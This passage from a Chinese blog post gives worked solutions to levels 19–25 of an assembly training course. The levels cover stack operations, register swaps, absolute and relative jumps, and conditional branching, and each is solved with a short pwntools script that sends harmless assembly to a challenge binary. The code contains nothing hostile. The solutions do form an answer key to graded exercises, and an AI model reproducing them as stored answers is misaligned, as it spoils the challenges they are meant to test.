class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">在这个级别中，你将使用栈，这是一个动态扩展和收缩的内存区域。你将需要读取和写入栈，这可能需要你使用 <span class="hljs-keyword">pop</span> 和 <span class="hljs-keyword">push</span> 指令。你可能还需要使用栈指针寄存器 (<span class="hljs-built_in">rsp</span>) 来了解栈的指向位置。<br><br>在这些级别中，我们将介绍栈。<br><br>栈是一个可以存储值以供以后使用的内存区域。<br><br>要将一个值存储在栈中，我们使用 <span class="hljs-keyword">push</span> 指令；要检索一个值，我们使用 <span class="hljs-keyword">pop</span> 指令。<br><br>栈是一种后进先出 (LIFO) 的内存结构，这意味着最后一个被推入的值将第一个被弹出。<br><br>想象一下从洗碗机中卸载盘子，假设有一个红色的、一个绿色的和一个蓝色的盘子。首先，我们将红色盘子放在柜子里，然后将绿色盘子放在红色盘子上面，最后放置蓝色盘子。<br><br>我们的盘子栈看起来像这样：<br>  顶部 ----&gt; 蓝色盘子<br>              绿色盘子<br>  底部 -&gt; 红色盘子<br><br>现在，如果我们想要一个盘子来做三明治，我们将从栈中检索顶部的盘子，也就是最后一个放入柜子的蓝色盘子，也就是第一个弹出的盘子。<br><br>在x86中，<span class="hljs-keyword">pop</span> 指令将从栈顶取出值并放入一个寄存器中。<br><br>类似地，<span class="hljs-keyword">push</span> 指令将寄存器中的值推入栈的顶部。<br><br>使用这些指令，取出栈顶的值，减去 <span class="hljs-built_in">rdi</span> 的值，然后将结果放回栈中。<br><br>现在，我们将进行以下设置以准备你的代码：<br>  <span class="hljs-built_in">rdi</span> = <span class="hljs-number">0x100d3</span><br>  (栈) [<span class="hljs-number">0x7fffff1ffff8</span>] = <span class="hljs-number">0x30267be3</span><br></code></pre></td></tr></table></figure><p>取出栈顶的值，减去 rdi 的值，然后将结果放回栈中</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment"># 设置架构</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br><br><span class="hljs-comment"># 创建一个进程对象并运行二进制文件</span><br>p = process(<span class="hljs-string">&#x27;/challenge/run&#x27;</span>)<br><br><span class="hljs-comment"># 接收并丢弃一行输出</span><br>p.recvline()<br><br>shellcode = asm(<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">       pop rax</span><br><span class="hljs-string">       sub rax,rdi</span><br><span class="hljs-string">       push rax</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span>)<br><br><span class="hljs-comment"># 发送汇编指令给进程</span><br>p.send(shellcode)<br><br><span class="hljs-comment"># 打印进程的输出</span><br><span class="hljs-built_in">print</span>(p.readallS())<br></code></pre></td></tr></table></figure><h1 id="20"><a href="#20" class="headerlink" title="20"></a>20</h1><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">在这个级别中，你将使用栈，这是一个动态扩展和收缩的内存区域。你将需要读取和写入栈，这可能需要你使用 <span class="hljs-keyword">pop</span> 和 <span class="hljs-keyword">push</span> 指令。你可能还需要使用栈指针寄存器 (<span class="hljs-built_in">rsp</span>) 来了解栈的指向位置。<br><br>在这个级别中，我们将探索栈的后进先出 (LIFO) 特性。<br><br>只能使用以下指令：  <br><span class="hljs-keyword">push</span>、<span class="hljs-keyword">pop</span><br><br>交换 <span class="hljs-built_in">rdi</span> 和 <span class="hljs-built_in">rsi</span> 中的值。  <br>例如，  <br>如果起始时 <span class="hljs-built_in">rdi</span> = <span class="hljs-number">2</span>，<span class="hljs-built_in">rsi</span> = <span class="hljs-number">5</span>  <br>那么最终 <span class="hljs-built_in">rdi</span> = <span class="hljs-number">5</span>，<span class="hljs-built_in">rsi</span> = <span class="hljs-number">2</span><br><br>现在，我们将进行以下设置以准备你的代码：  <br><span class="hljs-built_in">rdi</span> = <span class="hljs-number">0x7ff3244</span>  <br><span class="hljs-built_in">rsi</span> = <span class="hljs-number">0xa71fcb2</span><br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment"># 设置架构</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br><br><span class="hljs-comment"># 创建一个进程对象并运行二进制文件</span><br>p = process(<span class="hljs-string">&#x27;/challenge/run&#x27;</span>)<br><br><span class="hljs-comment"># 接收并丢弃一行输出</span><br>p.recvline()<br><br>shellcode = asm(<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">       push rdi</span><br><span class="hljs-string">       push rsi</span><br><span class="hljs-string">       pop rdi</span><br><span class="hljs-string">       pop rsi </span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span>)<br><br><span class="hljs-comment"># 发送汇编指令给进程</span><br>p.send(shellcode)<br><br><span class="hljs-comment"># 打印进程的输出</span><br><span class="hljs-built_in">print</span>(p.readallS())<br></code></pre></td></tr></table></figure><h1 id="21"><a href="#21" class="headerlink" title="21"></a>21</h1><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">在之前的级别中，你使用 <span class="hljs-keyword">push</span> 和 <span class="hljs-keyword">pop</span> 来将数据存储到栈中和从栈中加载数据。<br><br>然而，你也可以直接使用栈指针来访问栈。<br><br>在 x86 中，栈指针存储在特殊寄存器 <span class="hljs-built_in">rsp</span> 中。  <br><span class="hljs-built_in">rsp</span> 总是存储栈顶的内存地址，即最后一个被推入的值的内存地址。<br><br>类似于内存级别，我们可以使用 [<span class="hljs-built_in">rsp</span>] 来访问 <span class="hljs-built_in">rsp</span> 中存储的内存地址上的值。<br><br>请在不使用 <span class="hljs-keyword">pop</span> 的情况下计算栈上存储的连续四个四字节的平均值。<br><br>将平均值推入栈中。<br><span class="hljs-symbol"></span><br><span class="hljs-symbol">Hint:</span><br>  <span class="hljs-built_in">RSP</span>+0x?? Quad <span class="hljs-built_in">Word</span> A<br>  <span class="hljs-built_in">RSP</span>+0x?? Quad <span class="hljs-built_in">Word</span> B<br>  <span class="hljs-built_in">RSP</span>+0x?? Quad <span class="hljs-built_in">Word</span> C<br>  <span class="hljs-built_in">RSP</span>      Quad <span class="hljs-built_in">Word</span> D<br><br>现在，我们将进行以下设置以准备你的代码：  <br>(栈) [<span class="hljs-number">0x7fffff200000</span>:<span class="hljs-number">0x7fffff1fffe0</span>] = [<span class="hljs-string">&#x27;0xeb77e0b&#x27;</span>, <span class="hljs-string">&#x27;0x1e082933&#x27;</span>, <span class="hljs-string">&#x27;0x2ec86967&#x27;</span>, <span class="hljs-string">&#x27;0x392a5137&#x27;</span>]（事物列表）<br></code></pre></td></tr></table></figure><ul><li>使用 <code>[rsp]</code> 来访问 rsp 中存储的内存地址上的值</li><li>在不使用 pop 的情况下计算栈上存储的连续四个四字节的平均值</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment"># 设置架构</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br><br><span class="hljs-comment"># 创建一个进程对象并运行二进制文件</span><br>p = process(<span class="hljs-string">&#x27;/challenge/run&#x27;</span>)<br><br><span class="hljs-comment"># 接收并丢弃一行输出</span><br>p.recvline()<br><br>shellcode = asm(<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">       xor rax,rax</span><br><span class="hljs-string">       add rax,[rsp]</span><br><span class="hljs-string">       add rax,[rsp+8]</span><br><span class="hljs-string">       add rax,[rsp+16]</span><br><span class="hljs-string">       add rax,[rsp+24]</span><br><span class="hljs-string">       mov rdi,4</span><br><span class="hljs-string">       div rdi</span><br><span class="hljs-string">       push rax</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span>)<br><br><span class="hljs-comment"># 发送汇编指令给进程</span><br>p.send(shellcode)<br><br><span class="hljs-comment"># 打印进程的输出</span><br><span class="hljs-built_in">print</span>(p.readallS())<br></code></pre></td></tr></table></figure><h1 id="22"><a href="#22" class="headerlink" title="22"></a>22</h1><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">在这个级别中，你将使用控制流操作。这涉及使用指令直接或间接地控制特殊寄存器 `rip`，即指令指针。你将使用 <span class="hljs-keyword">jmp、call、cmp </span>等指令及其替代指令来实现所需的行为。<br><br>之前，你学习了如何以伪控制的方式操作数据，但是 x86 提供了直接操作控制流的实际指令。<br><br>有两种主要的控制流操作方式：  <br>通过跳转（<span class="hljs-keyword">jump）； </span> <br>通过调用（call）。<br><br>在这个级别中，你将使用跳转指令。<br><br>跳转指令有两种类型：  <br>无条件跳转（unconditional <span class="hljs-keyword">jumps） </span> <br>有条件跳转（conditional <span class="hljs-keyword">jumps）</span><br><span class="hljs-keyword"></span><br>无条件跳转总是触发的，不基于先前指令的结果。<br><br>正如你所知，内存位置可以存储数据和指令。<br><br>你的代码将存储在 <span class="hljs-number">0x4000bf</span>（每次运行都会改变）。<br><br>对于所有的跳转指令，有三种类型：  <br>相对跳转（relative <span class="hljs-keyword">jumps）：跳转到下一条指令的正向或负向偏移量。 </span> <br>绝对跳转（absolute <span class="hljs-keyword">jumps）：跳转到特定地址。 </span> <br>间接跳转（indirect <span class="hljs-keyword">jumps）：跳转到寄存器中指定的内存地址。</span><br><span class="hljs-keyword"></span><br>在 x86 中，绝对跳转（跳转到特定地址）的实现方式是先将目标地址放入一个寄存器中，然后执行 <span class="hljs-keyword">jmp </span>reg。<br><br>在这个级别中，我们要求你执行一个绝对跳转。<br><br>执行以下操作：  <br>跳转到绝对地址 <span class="hljs-number">0x403000</span><br><br>现在，我们将进行以下设置以准备你的代码：  <br>加载你提供的代码到地址：<span class="hljs-number">0x4000bf</span><br></code></pre></td></tr></table></figure><p>在 x86 中，绝对跳转（跳转到特定地址）的实现方式是<strong>先将目标地址放入一个寄存器中，然后执行 jmp reg</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment"># 设置架构</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br><br><span class="hljs-comment"># 创建一个进程对象并运行二进制文件</span><br>p = process(<span class="hljs-string">&#x27;/challenge/run&#x27;</span>)<br><br><span class="hljs-comment"># 接收并丢弃一行输出</span><br>p.recvline()<br><br>shellcode = asm(<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">       mov rax,0x403000</span><br><span class="hljs-string">       jmp rax</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span>)<br><br><span class="hljs-comment"># 发送汇编指令给进程</span><br>p.send(shellcode)<br><br><span class="hljs-comment"># 打印进程的输出</span><br><span class="hljs-built_in">print</span>(p.readallS())<br></code></pre></td></tr></table></figure><h1 id="23"><a href="#23" class="headerlink" title="23"></a>23</h1><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs awk">在这个级别中，你将使用控制流操作。这涉及使用指令直接或间接地控制特殊寄存器 `rip`，即指令指针。你将使用 jmp、call、cmp 等指令及其替代指令来实现所需的行为。<br><br>回想一下，对于所有的跳转指令，有三种类型：  <br>相对跳转（relative jumps）  <br>绝对跳转（absolute jumps）  <br>间接跳转（indirect jumps）<br><br>在这个级别中，我们要求你执行一个相对跳转。<br><br>你需要使用某种指令填充你的代码，以使这个相对跳转成为可能。<br><br>我们建议使用 `nop` 指令。它只占用一个字节的空间，而且非常可预测。<br><br>实际上，我们使用的汇编器有一个方便的 `.rept` 指令，你可以使用它来重复某个汇编指令多次：  <br>[https:<span class="hljs-regexp">//</span>ftp.gnu.org<span class="hljs-regexp">/old-gnu/</span>Manuals<span class="hljs-regexp">/gas-2.9.1/</span>html_chapter<span class="hljs-regexp">/as_7.html](https:/</span><span class="hljs-regexp">/ftp.gnu.org/</span>old-gnu<span class="hljs-regexp">/Manuals/g</span>as-<span class="hljs-number">2.9</span>.<span class="hljs-number">1</span><span class="hljs-regexp">/html_chapter/</span>as_7.html)<br><br>对于这个级别，有用的指令有：  <br>jmp (reg1 | addr | offset) ; nop<br><br>提示：对于相对跳转，查阅如何在 x86 中使用 `labels`。<br><br>利用上述知识，执行以下操作：  <br>将你的代码的第一条指令设置为 jmp  <br>将该 jmp 设置为相对跳转，跳转到当前位置后的 <span class="hljs-number">0</span>x51 个字节处  <br>在相对跳转将重新定向控制流的代码位置，将 rax 设置为 <span class="hljs-number">0</span>x1<br><br>现在，我们将进行以下设置以准备你的代码：  <br>加载你提供的代码到地址：<span class="hljs-number">0</span>x400054<br></code></pre></td></tr></table></figure><ul><li>使用label进行间接跳转</li><li>使用rept重复nop指令 0x51次<ul><li>使用rept可以重复某个汇编指令多次</li><li><code>nop</code> 指令只占用一个字节的空间，而且非常可预测</li></ul></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment"># 设置架构</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br><br><span class="hljs-comment"># 创建一个进程对象并运行二进制文件</span><br>p = process(<span class="hljs-string">&#x27;/challenge/run&#x27;</span>)<br><br><span class="hljs-comment"># 接收并丢弃一行输出</span><br>p.recvline()<br><br>shellcode = asm(<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    jmp short label_target        </span><br><span class="hljs-string">                               </span><br><span class="hljs-string">    .rept 0x50                    </span><br><span class="hljs-string">        nop</span><br><span class="hljs-string">    .endr</span><br><span class="hljs-string">label_target:</span><br><span class="hljs-string">    mov rax, 0x1                  </span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span>)<br><br><span class="hljs-comment"># 发送汇编指令给进程</span><br>p.send(shellcode)<br><br><span class="hljs-comment"># 打印进程的输出</span><br><span class="hljs-built_in">print</span>(p.readallS())<br></code></pre></td></tr></table></figure><h1 id="24"><a href="#24" class="headerlink" title="24"></a>24</h1><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">在这个级别中，你将使用控制流操作。这涉及使用指令直接或间接地控制特殊寄存器 <span class="hljs-string">`rip`</span>，即指令指针。你将使用 <span class="hljs-keyword">jmp</span>、<span class="hljs-keyword">call</span>、<span class="hljs-keyword">cmp</span> 等指令及其替代指令来实现所需的行为。<br><br>现在，我们将结合前两个级别，执行以下操作：  <br>创建一个两次跳转的跳板（trampoline）：  <br>将你的代码的第一条指令设置为 <span class="hljs-keyword">jmp</span>  <br>将该 <span class="hljs-keyword">jmp</span> 设置为相对跳转，跳转到当前位置后的 <span class="hljs-number">0x51</span> 个字节处  <br>在地址 <span class="hljs-number">0x51</span> 处写入以下代码：  <br>将栈顶的值放入寄存器 <span class="hljs-built_in">rdi</span>  <br>跳转到绝对地址 <span class="hljs-number">0x403000</span><br><br>现在，我们将进行以下设置以准备你的代码：  <br>加载你提供的代码到地址：<span class="hljs-number">0x40009a</span>  <br>(stack) [<span class="hljs-number">0x7fffff1ffff8</span>] = <span class="hljs-number">0xfe</span><br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment"># 设置架构</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br><br><span class="hljs-comment"># 创建一个进程对象并运行二进制文件</span><br>p = process(<span class="hljs-string">&#x27;/challenge/run&#x27;</span>)<br><br><span class="hljs-comment"># 接收并丢弃一行输出</span><br>p.recvline()<br><br>shellcode = asm(<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    jmp short label_target                      </span><br><span class="hljs-string">    .rept 0x51                 </span><br><span class="hljs-string">        nop</span><br><span class="hljs-string">    .endr</span><br><span class="hljs-string">label_target:</span><br><span class="hljs-string">    pop rdi</span><br><span class="hljs-string">    mov rax,0x403000</span><br><span class="hljs-string">    jmp rax</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span>)<br><br><span class="hljs-comment"># 发送汇编指令给进程</span><br>p.send(shellcode)<br><br><span class="hljs-comment"># 打印进程的输出</span><br><span class="hljs-built_in">print</span>(p.readallS())<br></code></pre></td></tr></table></figure><h1 id="25"><a href="#25" class="headerlink" title="25"></a>25</h1><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">在这个级别中，你将使用控制流操作。这涉及使用指令直接或间接地控制特殊寄存器 <span class="hljs-string">`rip`</span>，即指令指针。你将使用 <span class="hljs-keyword">jmp</span>、<span class="hljs-keyword">call</span>、<span class="hljs-keyword">cmp</span> 等指令及其替代指令来实现所需的行为。<br><br>在这个级别中，我们将多次测试你的代码，使用动态值来运行你的代码！这意味着我们将以各种随机的方式运行你的代码，以验证逻辑是否足够健壮，能够在正常使用中生存。<br><br>现在，我们将向你介绍条件跳转——这是 x86 中最有价值的指令之一。<br>在高级编程语言中，存在 if-else 结构，用于执行以下操作：<br>  如果 x 是偶数：<br>    is_even = <span class="hljs-number">1</span><br>  否则：<br>    is_even = <span class="hljs-number">0</span><br><br>这应该很熟悉，因为它可以仅通过位逻辑来实现，而你在之前的级别中已经做过了。<br><br>在这些结构中，我们可以根据提供给程序的动态值来控制程序的控制流。<br><br>使用 <span class="hljs-keyword">jmp</span> 来实现上述逻辑可以这样做：<br><br>~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~<br><span class="hljs-comment">; 假设 rdi = x，rax 是输出</span><br><span class="hljs-comment">; rdx = rdi mod 2</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-built_in">rdi</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">rsi</span>, <span class="hljs-number">2</span><br><span class="hljs-keyword">div</span> <span class="hljs-built_in">rsi</span><br><span class="hljs-comment">; 余数为 0 表示偶数</span><br><span class="hljs-keyword">cmp</span> <span class="hljs-built_in">rdx</span>, <span class="hljs-number">0</span><br><span class="hljs-comment">; 如果不为 0，则跳转到 not_even 代码</span><br><span class="hljs-keyword">jne</span> not_even<br><span class="hljs-comment">; 否则继续执行 even 代码</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">rbx</span>, <span class="hljs-number">1</span><br><span class="hljs-keyword">jmp</span> done<br><span class="hljs-comment">; 只有在 not_even 时才跳转到此处</span><br><span class="hljs-symbol">not_even:</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">rbx</span>, <span class="hljs-number">0</span><br><span class="hljs-symbol">done:</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-built_in">rbx</span><br><span class="hljs-comment">; 这里可以有更多的指令</span><br>~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~<br><br>然而，通常你不仅仅想要一个单独的 <span class="hljs-string">&#x27;if-else&#x27;</span> 结构。<br><br>有时你想要两个 if 检查，然后是一个 else。<br><br>为了做到这一点，你需要确保在失败后，控制流会“落入”到下一个 <span class="hljs-string">`if`</span>。<br><br>所有的代码执行后必须跳转到同一个 <span class="hljs-string">`done`</span> 位置，以避免执行 else 代码。<br><br>x86 中有很多种跳转类型，了解它们的用法会很有帮助。<br><br>几乎所有的跳转都依赖于一个叫做 ZF 的标志位，即零标志位。<br><br>当 <span class="hljs-keyword">cmp</span> 相等时，ZF 被设置为 <span class="hljs-number">1</span>，否则为 <span class="hljs-number">0</span>。<br><br>利用上述知识，实现以下内容：<br>  如果 [x] 是 <span class="hljs-number">0x7f454c46</span>：<br>    y = [x+<span class="hljs-number">4</span>] + [x+<span class="hljs-number">8</span>] + [x+<span class="hljs-number">12</span>]<br>  否则如果 [x] 是 <span class="hljs-number">0x00005A4D</span>：<br>    y = [x+<span class="hljs-number">4</span>] - [x+<span class="hljs-number">8</span>] - [x+<span class="hljs-number">12</span>]<br>  否则：<br>    y = [x+<span class="hljs-number">4</span>] * [x+<span class="hljs-number">8</span>] * [x+<span class="hljs-number">12</span>]<br><br>其中：<br>  x = <span class="hljs-built_in">rdi</span>，y = <span class="hljs-built_in">rax</span>。<br><br>假设每个解引用的值都是有符号的 <span class="hljs-built_in">dword</span>。<br>这意味着每个内存位置上的值可以是负值。<br><br>一个有效的解决方案至少要使用以下指令之一：<br>  <span class="hljs-keyword">jmp</span>（任意变体），<span class="hljs-keyword">cmp</span><br><br>现在，我们将在你的代码上运行多次测试，这是一个示例运行：<br>  (data) [<span class="hljs-number">0x404000</span>] = &#123;<span class="hljs-number">4</span> 个随机的 <span class="hljs-built_in">dword</span>&#125;<br>  <span class="hljs-built_in">rdi</span> = <span class="hljs-number">0x404000</span><br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span 